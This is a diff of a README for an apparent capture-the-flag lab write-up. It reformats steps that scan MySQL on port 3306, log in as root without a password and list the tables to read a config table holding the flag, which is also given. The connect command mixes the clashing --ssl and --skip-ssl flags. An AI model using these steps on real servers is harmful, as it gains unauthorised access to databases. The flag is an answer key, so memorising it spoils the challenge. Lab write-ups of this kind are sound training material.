@@ -25,17 +25,16 @@ screenshots/ – proof of each step
 articles/ – Dev.to markdown
 
 # Lab Steps
-Scan: nmap -sC -sV -p3306 $IP
-
-# Connect: mysql --ssl -h $IP -u root --skip-ssl
-
-Enumerate:
-
+1. Scan: nmap -sC -sV -p3306 $IP
+2. Connect: mysql --ssl -h $IP -u root --skip-ssl
+3. Enumerate:
+```
 SHOW DATABASES;
 USE htb;
 SHOW TABLES;
 SELECT * FROM config;
-Flag: 7b4bec00d1a39e3dd4e021ec3d915da8
+```
+4. Flag: 7b4bec00d1a39e3dd4e021ec3d915da8
 
 # Connect
 
